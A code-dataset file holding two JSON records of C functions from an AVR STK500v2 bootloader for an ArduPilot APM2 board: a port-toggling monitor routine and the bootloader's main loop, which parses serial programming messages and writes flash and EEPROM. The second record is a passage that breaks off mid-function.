{"docstring": "//************************************************************************\n", "func_signal": "static void\tAVR_PortOutput(void)", "code": "{\nchar\tportLetter;\nchar\tgetCharFlag;\n\n\tPrintFromPROGMEM(gTextMsg_WHAT_PORT, 0);\n\n\tportLetter\t=\trecchar();\n\tportLetter\t=\tportLetter & 0x5f;\n\tsendchar(portLetter);\n\tPrintNewLine();\n\n\tif ((portLetter >= 'A') && (portLetter <= 'Z'))\n\t{\n\t\tgetCharFlag\t=\ttrue;\n\t\tswitch(portLetter)\n\t\t{\n\t\t#ifdef DDRA\n\t\t\tcase 'A':\n\t\t\t\tDDRA\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTA\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTA\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRB\n\t\t\tcase 'B':\n\t\t\t\tDDRB\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTB\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTB\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRC\n\t\t\tcase 'C':\n\t\t\t\tDDRC\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTC\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTC\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRD\n\t\t\tcase 'D':\n\t\t\t\tDDRD\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTD\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTD\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRE\n\t\t\tcase 'E':\n\t\t\t\tDDRE\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTE\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTE\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRF\n\t\t\tcase 'F':\n\t\t\t\tDDRF\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTF\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTF\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRG\n\t\t\tcase 'G':\n\t\t\t\tDDRG\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTG\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTG\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRH\n\t\t\tcase 'H':\n\t\t\t\tDDRH\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTH\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTH\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRI\n\t\t\tcase 'I':\n\t\t\t\tDDRI\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTI\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTI\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRJ\n\t\t\tcase 'J':\n\t\t\t\tDDRJ\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTJ\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTJ\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRK\n\t\t\tcase 'K':\n\t\t\t\tDDRK\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTK\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTK\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t#ifdef DDRL\n\t\t\tcase 'L':\n\t\t\t\tDDRL\t=\t0xff;\n\t\t\t\twhile (!Serial_Available())\n\t\t\t\t{\n\t\t\t\t\tPORTL\t^=\t0xff;\n\t\t\t\t\tdelay_ms(200);\n\t\t\t\t}\n\t\t\t\tPORTL\t=\t0;\n\t\t\t\tbreak;\n\t\t#endif\n\n\t\t\tdefault:\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_PortNotSupported, 0);\n\t\t\t\tgetCharFlag\t=\tfalse;\n\t\t\t\tbreak;\n\t\t}\n\t\tif (getCharFlag)\n\t\t{\n\t\t\trecchar();\n\t\t}\n\t}\n\telse\n\t{\n\t\tPrintFromPROGMEMln(gTextMsg_MustBeLetter, 0);\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//*****************************************************************************\n", "func_signal": "int main(void)", "code": "{\n\taddress_t\t\taddress\t\t\t=\t0;\n\taddress_t\t\teraseAddress\t=\t0;\n\tunsigned char\tmsgParseState;\n\tunsigned int\tii\t\t\t\t=\t0;\n\tunsigned char\tchecksum\t\t=\t0;\n\tunsigned char\tseqNum\t\t\t=\t0;\n\tunsigned int\tmsgLength\t\t=\t0;\n\tunsigned char\tmsgBuffer[285];\n\tunsigned char\tc, *p;\n\tunsigned char   isLeave = 0;\n\n\tunsigned long\tboot_timeout;\n\tunsigned long\tboot_timer;\n\tunsigned int\tboot_state;\n#ifdef ENABLE_MONITOR\n\tunsigned int\texPointCntr\t=\t0;\n#endif\n\n\tuint8_t ch;\n\tch = MCUSR;\n\n\t__asm__ __volatile__ (\"cli\");\n\t__asm__ __volatile__ (\"wdr\");\n\tMCUSR = 0;\n\tWDTCSR |= _BV(WDCE) | _BV(WDE);\n\tWDTCSR = 0;\n\t__asm__ __volatile__ (\"sei\");\n\n\t// check if WDT generated the reset, if so, go straight to app\n\tif (ch & _BV(WDRF)) {\n            asm volatile(\n                    \"clr\tr30\t\t\\n\\t\"\n                    \"clr\tr31\t\t\\n\\t\"\n                    \"ijmp\t\\n\\t\"\n                    );\n    }\n\n\tboot_timer\t=\t0;\n\tboot_state\t=\t0;\n\n#ifdef BLINK_LED_WHILE_WAITING\n\tboot_timeout\t=\t 90000;\t\t//*\tshould be about 4 seconds\n#else\n\tboot_timeout\t=\t3500000;    // 7 seconds , approx 2us per step when optimize \"s\"\n#endif\n\t/*\n\t * Branch to bootloader or application code ?\n\t */\n\n\t/*\n\t * Init UART\n\t * set baudrate and enable USART receiver and transmiter without interrupts\n\t */\n#if UART_BAUDRATE_DOUBLE_SPEED\n\tUART_STATUS_REG\t\t|=\t(1 <<UART_DOUBLE_SPEED);\n#endif\n\tUART_BAUD_RATE_LOW\t=\tUART_BAUD_SELECT(BAUDRATE,F_CPU);\n\tUART_CONTROL_REG\t=\t(1 << UART_ENABLE_RECEIVER) | (1 << UART_ENABLE_TRANSMITTER);\n\n\tasm volatile (\"nop\");\t\t\t// wait until port has changed\n\n#ifndef REMOVE_BOOTLOADER_LED\n\t/* PROG_PIN pulled low, indicate with LED that bootloader is active */\n\tPROGLED_DDR\t\t|=\t((1<<PINB3)|(1<<PINB4)|(1<<PINB5));\n    // turn them all off\n\tPROGLED_PORT\t|=\t((1<<PINB3)|(1<<PINB4)|(1<<PINB5));\n\n#endif\n\n#if defined(__AVR_ATmega2560__)\n    // Check for hardware ident as an APM2 board\n    // if (PINK & 3) { // 2560 A8 and A9 are HIGH\n        // pin 23 is PA1,23,D23  and is BV(1) --> DDRA\n\n        int usb_connected = !(PINA & 2);\n        if (!usb_connected) {\n            // Start sketch immediately if a USB connection is not detected\n            for (ii=0; ii<2; ii++)\n            {\n                PROGLED_PORT\t&=\t~(1<<PROGLED_PIN);\t// turn LED on\n                delay_ms(100);\n                PROGLED_PORT\t|=\t(1<<PROGLED_PIN);\t// turn LED off\n                delay_ms(100);\n            }\n            for (ii=0; ii<2; ii++)\n            {\n                PROGLED_PORT\t&=\t~(1<<PINB4);\t    // turn LED on\n                delay_ms(100);\n                PROGLED_PORT\t|=\t(1<<PINB4);\t// turn LED off\n            }\n            delay_ms(500);\n            asm volatile(\n                    \"clr\tr30\t\t\\n\\t\"\n                    \"clr\tr31\t\t\\n\\t\"\n                    \"ijmp\t\\n\\t\"\n                    );\n            //app_start();\n\t        for(;;);\n        } \n    //}\n#endif\n\n#ifdef _DEBUG_SERIAL_\n//\tdelay_ms(500);\n\n\tsendchar('s');\n\tsendchar('t');\n\tsendchar('k');\n//\tsendchar('5');\n//\tsendchar('0');\n//\tsendchar('0');\n\tsendchar('v');\n\tsendchar('2');\n\tsendchar(0x0d);\n\tsendchar(0x0a);\n\n\tdelay_ms(100);\n#endif\n\n\twhile (boot_state==0)\n\t{\n\t\twhile ((!(Serial_Available())) && (boot_state == 0))\t\t// wait for data\n\t\t{\n\t\t\t_delay_ms(0.001);\n\t\t\tboot_timer++;\n\t\t\tif (boot_timer > boot_timeout)\n\t\t\t{\n\t\t\t\tboot_state\t=\t1; // (after ++ -> boot_state=2 bootloader timeout, jump to main 0x00000 )\n\t\t\t}\n\t\t#ifdef BLINK_LED_WHILE_WAITING\n\t\t\tif ((boot_timer % 7000) == 0)\n\t\t\t{\n\t\t\t\t//*\ttoggle the LED\n\t\t\t\tPROGLED_PORT\t^=\t(1<<PROGLED_PIN);\t// turn LED ON\n\t\t\t}\n\t\t#endif\n\t\t}\n        boot_state++; // ( if boot_state=1 bootloader received byte from UART, enter bootloader mode)\n\t}\n\n    boot_timer = 0;\n\tif (boot_state==1)\n\t{\n\t\t//*\tmain loop\n\t\twhile (!isLeave)\n\t\t{\n\t\t\t/*\n\t\t\t * Collect received bytes to a complete message\n\t\t\t */\n\t\t\tmsgParseState\t=\tST_START;\n\t\t\twhile ( msgParseState != ST_PROCESS )\n\t\t\t{\n                if (boot_timer > 32) {\n                    isLeave = 1;\n                    msgParseState = 99;\n                    break;\n                }\n\n\t\t\t\tif (boot_state==1)\n\t\t\t\t{\n\t\t\t\t\tboot_state\t=\t0;\n\t\t\t\t\tc\t\t\t=\tUART_DATA_REG;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t//\tc\t=\trecchar();\n\t\t\t\t\tc\t=\trecchar_timeout();\n\t\t\t\t}\n\n\t\t\t#ifdef ENABLE_MONITOR\n\t\t\t\tif (c == '!')\n\t\t\t\t{\n\t\t\t\t\texPointCntr++;\n\t\t\t\t\tif (exPointCntr == 3)\n\t\t\t\t\t{\n\t\t\t\t\t\tRunMonitor();\n\t\t\t\t\t\texPointCntr\t\t=\t0;\t//\treset back to zero so we dont get in an endless loop\n\t\t\t\t\t\tisLeave\t\t\t=\t1;\n\t\t\t\t\t\tmsgParseState\t=\t99;\t//*\twe dont want it do anything\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\texPointCntr\t=\t0;\n\t\t\t\t}\n\t\t\t#endif\n\n\t\t\t\tswitch (msgParseState)\n\t\t\t\t{\n\t\t\t\t\tcase ST_START:\n\t\t\t\t\t\tif ( c == MESSAGE_START )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_GET_SEQ_NUM;\n\t\t\t\t\t\t\tchecksum\t\t=\tMESSAGE_START^0;\n\t\t\t\t\t\t} else {\n                            boot_timer++;\n                        }\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_GET_SEQ_NUM:\n\t\t\t\t\t\tif ( (c == 1) || (c == seqNum) )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tseqNum\t\t\t=\tc;\n\t\t\t\t\t\t\tmsgParseState\t=\tST_MSG_SIZE_1;\n\t\t\t\t\t\t\tchecksum\t\t^=\tc;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_START;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_MSG_SIZE_1:\n\t\t\t\t\t\tmsgLength\t\t=\tc<<8;\n\t\t\t\t\t\tmsgParseState\t=\tST_MSG_SIZE_2;\n\t\t\t\t\t\tchecksum\t\t^=\tc;\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_MSG_SIZE_2:\n\t\t\t\t\t\tmsgLength\t\t|=\tc;\n\t\t\t\t\t\tmsgParseState\t=\tST_GET_TOKEN;\n\t\t\t\t\t\tchecksum\t\t^=\tc;\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_GET_TOKEN:\n\t\t\t\t\t\tif ( c == TOKEN )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_GET_DATA;\n\t\t\t\t\t\t\tchecksum\t\t^=\tc;\n\t\t\t\t\t\t\tii\t\t\t\t=\t0;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_START;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_GET_DATA:\n\t\t\t\t\t\tmsgBuffer[ii++]\t=\tc;\n\t\t\t\t\t\tchecksum\t\t^=\tc;\n\t\t\t\t\t\tif (ii == msgLength )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_GET_CHECK;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase ST_GET_CHECK:\n\t\t\t\t\t\tif ( c == checksum )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_PROCESS;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgParseState\t=\tST_START;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\t//\tswitch\n\t\t\t}\t//\twhile(msgParseState)\n\n            if (msgParseState == 99) {\n                continue;\n            }\n\n\t\t\t/*\n\t\t\t * Now process the STK500 commands, see Atmel Appnote AVR068\n\t\t\t */\n\n\t\t\tswitch (msgBuffer[0])\n\t\t\t{\n\t#ifndef REMOVE_CMD_SPI_MULTI\n\t\t\t\tcase CMD_SPI_MULTI:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned char answerByte;\n\t\t\t\t\t\tunsigned char flag=0;\n\n\t\t\t\t\t\tif ( msgBuffer[4]== 0x30 )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tunsigned char signatureIndex\t=\tmsgBuffer[6];\n\n\t\t\t\t\t\t\tif ( signatureIndex == 0 )\n\t\t\t\t\t\t\t\tanswerByte\t=\t(SIGNATURE_BYTES >>16) & 0x000000FF;\n\t\t\t\t\t\t\telse if ( signatureIndex == 1 )\n\t\t\t\t\t\t\t\tanswerByte\t=\t(SIGNATURE_BYTES >> 8) & 0x000000FF;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tanswerByte\t=\tSIGNATURE_BYTES & 0x000000FF;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if ( msgBuffer[4] & 0x50 )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tanswerByte\t=\t0; //read fuse/lock bits not implemented, return dummy value\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tanswerByte\t=\t0; // for all others command are not implemented, return dummy value for AVRDUDE happy <Worapoht>\n\t//\t\t\t\t\t\tflag\t=\t1; // Remark this line for AVRDUDE <Worapoht>\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !flag )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmsgLength\t\t=\t7;\n\t\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\t\tmsgBuffer[2]\t=\t0;\n\t\t\t\t\t\t\tmsgBuffer[3]\t=\tmsgBuffer[4];\n\t\t\t\t\t\t\tmsgBuffer[4]\t=\t0;\n\t\t\t\t\t\t\tmsgBuffer[5]\t=\tanswerByte;\n\t\t\t\t\t\t\tmsgBuffer[6]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t#endif\n\t\t\t\tcase CMD_SIGN_ON:\n\t\t\t\t\tmsgLength\t\t=\t11;\n\t\t\t\t\tmsgBuffer[1] \t=\tSTATUS_CMD_OK;\n\t\t\t\t\tmsgBuffer[2] \t=\t8;\n\t\t\t\t\tmsgBuffer[3] \t=\t'A';\n\t\t\t\t\tmsgBuffer[4] \t=\t'V';\n\t\t\t\t\tmsgBuffer[5] \t=\t'R';\n\t\t\t\t\tmsgBuffer[6] \t=\t'I';\n\t\t\t\t\tmsgBuffer[7] \t=\t'S';\n\t\t\t\t\tmsgBuffer[8] \t=\t'P';\n\t\t\t\t\tmsgBuffer[9] \t=\t'_';\n\t\t\t\t\tmsgBuffer[10]\t=\t'2';\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_GET_PARAMETER:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned char value;\n\n\t\t\t\t\t\tswitch(msgBuffer[1])\n\t\t\t\t\t\t{\n\t\t\t\t\t\tcase PARAM_BUILD_NUMBER_LOW:\n\t\t\t\t\t\t\tvalue\t=\tCONFIG_PARAM_BUILD_NUMBER_LOW;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase PARAM_BUILD_NUMBER_HIGH:\n\t\t\t\t\t\t\tvalue\t=\tCONFIG_PARAM_BUILD_NUMBER_HIGH;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase PARAM_HW_VER:\n\t\t\t\t\t\t\tvalue\t=\tCONFIG_PARAM_HW_VER;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase PARAM_SW_MAJOR:\n\t\t\t\t\t\t\tvalue\t=\tCONFIG_PARAM_SW_MAJOR;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase PARAM_SW_MINOR:\n\t\t\t\t\t\t\tvalue\t=\tCONFIG_PARAM_SW_MINOR;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tvalue\t=\t0;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmsgLength\t\t=\t3;\n\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\tmsgBuffer[2]\t=\tvalue;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_LEAVE_PROGMODE_ISP:\n\t\t\t\t\tisLeave\t=\t1;\n\t\t\t\t\t//*\tfall thru\n\n\t\t\t\tcase CMD_SET_PARAMETER:\n\t\t\t\tcase CMD_ENTER_PROGMODE_ISP:\n\t\t\t\t\tmsgLength\t\t=\t2;\n\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_READ_SIGNATURE_ISP:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned char signatureIndex\t=\tmsgBuffer[4];\n\t\t\t\t\t\tunsigned char signature;\n\n\t\t\t\t\t\tif ( signatureIndex == 0 )\n\t\t\t\t\t\t\tsignature\t=\t(SIGNATURE_BYTES >>16) & 0x000000FF;\n\t\t\t\t\t\telse if ( signatureIndex == 1 )\n\t\t\t\t\t\t\tsignature\t=\t(SIGNATURE_BYTES >> 8) & 0x000000FF;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tsignature\t=\tSIGNATURE_BYTES & 0x000000FF;\n\n\t\t\t\t\t\tmsgLength\t\t=\t4;\n\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\tmsgBuffer[2]\t=\tsignature;\n\t\t\t\t\t\tmsgBuffer[3]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_READ_LOCK_ISP:\n\t\t\t\t\tmsgLength\t\t=\t4;\n\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\tmsgBuffer[2]\t=\tboot_lock_fuse_bits_get( GET_LOCK_BITS );\n\t\t\t\t\tmsgBuffer[3]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_READ_FUSE_ISP:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned char fuseBits;\n\n\t\t\t\t\t\tif ( msgBuffer[2] == 0x50 )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif ( msgBuffer[3] == 0x08 )\n\t\t\t\t\t\t\t\tfuseBits\t=\tboot_lock_fuse_bits_get( GET_EXTENDED_FUSE_BITS );\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tfuseBits\t=\tboot_lock_fuse_bits_get( GET_LOW_FUSE_BITS );\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfuseBits\t=\tboot_lock_fuse_bits_get( GET_HIGH_FUSE_BITS );\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmsgLength\t\t=\t4;\n\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\tmsgBuffer[2]\t=\tfuseBits;\n\t\t\t\t\t\tmsgBuffer[3]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t#ifndef REMOVE_PROGRAM_LOCK_BIT_SUPPORT\n\t\t\t\tcase CMD_PROGRAM_LOCK_ISP:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned char lockBits\t=\tmsgBuffer[4];\n\n\t\t\t\t\t\tlockBits\t=\t(~lockBits) & 0x3C;\t// mask BLBxx bits\n\t\t\t\t\t\tboot_lock_bits_set(lockBits);\t\t// and program it\n\t\t\t\t\t\tboot_spm_busy_wait();\n\n\t\t\t\t\t\tmsgLength\t\t=\t3;\n\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\tmsgBuffer[2]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t#endif\n\t\t\t\tcase CMD_CHIP_ERASE_ISP:\n\t\t\t\t\teraseAddress\t=\t0;\n\t\t\t\t\tmsgLength\t\t=\t2;\n\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_LOAD_ADDRESS:\n\t#if defined(RAMPZ)\n\t\t\t\t\taddress\t=\t( ((address_t)(msgBuffer[1])<<24)|((address_t)(msgBuffer[2])<<16)|((address_t)(msgBuffer[3])<<8)|(msgBuffer[4]) )<<1;\n\t#else\n\t\t\t\t\taddress\t=\t( ((msgBuffer[3])<<8)|(msgBuffer[4]) )<<1;\t\t//convert word to byte address\n\t#endif\n\t\t\t\t\tmsgLength\t\t=\t2;\n\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_PROGRAM_FLASH_ISP:\n\t\t\t\tcase CMD_PROGRAM_EEPROM_ISP:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned int\tsize\t=\t((msgBuffer[1])<<8) | msgBuffer[2];\n\t\t\t\t\t\tunsigned char\t*p\t=\tmsgBuffer+10;\n\t\t\t\t\t\tunsigned int\tdata;\n\t\t\t\t\t\tunsigned char\thighByte, lowByte;\n\t\t\t\t\t\taddress_t\t\ttempaddress\t=\taddress;\n\n\n\t\t\t\t\t\tif ( msgBuffer[0] == CMD_PROGRAM_FLASH_ISP )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t// erase only main section (bootloader protection)\n\t\t\t\t\t\t\tif (eraseAddress < APP_END )\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tboot_page_erase(eraseAddress);\t// Perform page erase\n\t\t\t\t\t\t\t\tboot_spm_busy_wait();\t\t// Wait until the memory is erased.\n\t\t\t\t\t\t\t\teraseAddress += SPM_PAGESIZE;\t// point to next page to be erase\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t/* Write FLASH */\n\t\t\t\t\t\t\tdo {\n\t\t\t\t\t\t\t\tlowByte\t\t=\t*p++;\n\t\t\t\t\t\t\t\thighByte \t=\t*p++;\n\n\t\t\t\t\t\t\t\tdata\t\t=\t(highByte << 8) | lowByte;\n\t\t\t\t\t\t\t\tboot_page_fill(address,data);\n\n\t\t\t\t\t\t\t\taddress\t=\taddress + 2;\t// Select next word in memory\n\t\t\t\t\t\t\t\tsize\t-=\t2;\t\t\t\t// Reduce number of bytes to write by two\n\t\t\t\t\t\t\t} while (size);\t\t\t\t\t// Loop until all bytes written\n\n\t\t\t\t\t\t\tboot_page_write(tempaddress);\n\t\t\t\t\t\t\tboot_spm_busy_wait();\n\t\t\t\t\t\t\tboot_rww_enable();\t\t\t\t// Re-enable the RWW section\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t#if (!defined(__AVR_ATmega1280__) && !defined(__AVR_ATmega2560__)  && !defined(__AVR_ATmega2561__)  && !defined(__AVR_ATmega1284P__)  && !defined(__AVR_ATmega640__))\n\t\t\t\t\t//\t#if (defined(EEARL) && defined(EEARH)  && defined(EEMWE)  && defined(EEWE)  && defined(EEDR))\n\t\t\t\t\t\t\t/* write EEPROM */\n\t\t\t\t\t\t\tdo {\n\t\t\t\t\t\t\t\tEEARL\t=\taddress;\t\t\t// Setup EEPROM address\n\t\t\t\t\t\t\t\tEEARH\t=\t(address >> 8);\n\t\t\t\t\t\t\t\taddress++;\t\t\t\t\t\t// Select next EEPROM byte\n\n\t\t\t\t\t\t\t\tEEDR\t=\t*p++;\t\t\t\t// get byte from buffer\n\t\t\t\t\t\t\t\tEECR\t|=\t(1<<EEMWE);\t\t\t// Write data into EEPROM\n\t\t\t\t\t\t\t\tEECR\t|=\t(1<<EEWE);\n\n\t\t\t\t\t\t\t\twhile (EECR & (1<<EEWE));\t// Wait for write operation to finish\n\t\t\t\t\t\t\t\tsize--;\t\t\t\t\t\t// Decrease number of bytes to write\n\t\t\t\t\t\t\t} while (size);\t\t\t\t\t// Loop until all bytes written\n\t\t\t\t\t\t#endif\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmsgLength\t=\t2;\n\t\t\t\t\t\tmsgBuffer[1]\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase CMD_READ_FLASH_ISP:\n\t\t\t\tcase CMD_READ_EEPROM_ISP:\n\t\t\t\t\t{\n\t\t\t\t\t\tunsigned int\tsize\t=\t((msgBuffer[1])<<8) | msgBuffer[2];\n\t\t\t\t\t\tunsigned char\t*p\t\t=\tmsgBuffer+1;\n\t\t\t\t\t\tmsgLength\t\t\t\t=\tsize+3;\n\n\t\t\t\t\t\t*p++\t=\tSTATUS_CMD_OK;\n\t\t\t\t\t\tif (msgBuffer[0] == CMD_READ_FLASH_ISP )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tunsigned int data;\n\n\t\t\t\t\t\t\t// Read FLASH\n\t\t\t\t\t\t\tdo {\n\t\t\t\t\t\t//#if defined(RAMPZ)\n\t\t\t\t\t\t#if (FLASHEND > 0x10000)\n\t\t\t\t\t\t\t\tdata\t=\tpgm_read_word_far(address);\n\t\t\t\t\t\t#else\n\t\t\t\t\t\t\t\tdata\t=\tpgm_read_word_near(address);\n\t\t\t\t\t\t#endif\n\t\t\t\t\t\t\t\t*p++\t=\t(unsigned char)data;\t\t//LSB\n\t\t\t\t\t\t\t\t*p++\t=\t(unsigned char)(data >> 8);\t//MSB\n\t\t\t\t\t\t\t\taddress\t+=\t2;\t\t\t\t\t\t\t// Select next word in memory\n\t\t\t\t\t\t\t\tsize\t-=\t2;\n\t\t\t\t\t\t\t}while (size);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t/* Read EEPROM */\n\t\t\t\t\t\t\tdo {\n\t\t\t\t\t\t\t\tEEARL\t=\taddress;\t\t\t// Setup EEPROM address\n\t\t\t\t\t\t\t\tEEARH\t=\t((address >> 8));\n\t\t\t\t\t\t\t\taddress++;\t\t\t\t\t// Select next EEPROM byte\n\t\t\t\t\t\t\t\tEECR\t|=\t(1<<EERE);\t\t\t// Read EEPROM\n\t\t\t\t\t\t\t\t*p++\t=\tEEDR;\t\t\t\t// Send EEPROM data\n\t\t\t\t\t\t\t\tsize--;\n\t\t\t\t\t\t\t} while 